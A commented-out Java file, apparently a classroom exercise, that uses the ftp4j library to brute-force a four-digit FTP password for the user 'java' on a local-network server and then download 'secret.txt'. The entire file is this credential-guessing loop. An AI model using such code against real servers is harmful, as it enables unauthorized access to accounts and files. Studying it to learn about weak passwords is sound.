//package week_03.day_10_0817;
//
//import it.sauronsoftware.ftp4j.FTPClient;
//import it.sauronsoftware.ftp4j.FTPException;
//import it.sauronsoftware.ftp4j.FTPIllegalReplyException;
//
//import java.io.File;
//import java.io.IOException;
//
//
//public class Main {
//    public static void main(String[] args) throws FTPIllegalReplyException, IOException, FTPException {
//
//        FTPClient client = new FTPClient();
//        String fileName = "secret.txt";
//        File file = new File("C:/study/kh/공유파일/" + fileName);
//
//        client.connect("192.168.50.65", 21);
//        int num = 0;
//        while (true) {
//            String numString = "00000" + num++;
//            String password = numString.substring((numString.length()-4), numString.length());
//            try {
//                System.out.println(password);
//                client.login("java", password);
//                client.download(fileName, file);
//                break;
//            } catch (Exception e) {}
//        }
//        client.disconnect(true);
//    }
//}